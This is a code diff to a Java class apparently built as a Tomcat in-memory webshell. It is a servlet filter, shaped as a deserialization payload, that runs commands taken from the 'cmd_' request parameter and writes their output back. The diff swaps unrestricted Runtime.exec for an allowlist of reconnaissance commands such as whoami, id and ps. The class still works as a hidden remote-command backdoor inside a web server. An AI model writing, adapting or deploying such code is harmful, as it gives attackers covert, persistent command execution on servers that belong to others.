@@ -94,7 +94,28 @@ public class TomcatFilterMemShell extends AbstractTranslet implements Filter {
     public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
         String cmd;
         if ((cmd = servletRequest.getParameter("cmd_")) != null) {
-            Process process = Runtime.getRuntime().exec(cmd);
+            java.util.Set<String> allowedCommands = new java.util.HashSet<>(
+                    java.util.Arrays.asList("whoami", "hostname", "date", "uptime", "id", "uname", "df", "ps"));
+            String[] parts = cmd.trim().split("\\s+");
+            if (parts.length == 0) {
+                servletResponse.getOutputStream().write("Invalid command".getBytes());
+                servletResponse.getOutputStream().flush();
+                servletResponse.getOutputStream().close();
+                return;
+            }
+            String commandName = parts[0];
+            int lastSlash = commandName.lastIndexOf('/');
+            if (lastSlash >= 0) {
+                commandName = commandName.substring(lastSlash + 1);
+            }
+            if (!allowedCommands.contains(commandName)) {
+                servletResponse.getOutputStream().write("Command not allowed".getBytes());
+                servletResponse.getOutputStream().flush();
+                servletResponse.getOutputStream().close();
+                return;
+            }
+            ProcessBuilder pb = new ProcessBuilder(parts);
+            Process process = pb.start();
             java.io.BufferedReader bufferedReader = new java.io.BufferedReader(
                     new java.io.InputStreamReader(process.getInputStream()));
             StringBuilder stringBuilder = new StringBuilder();
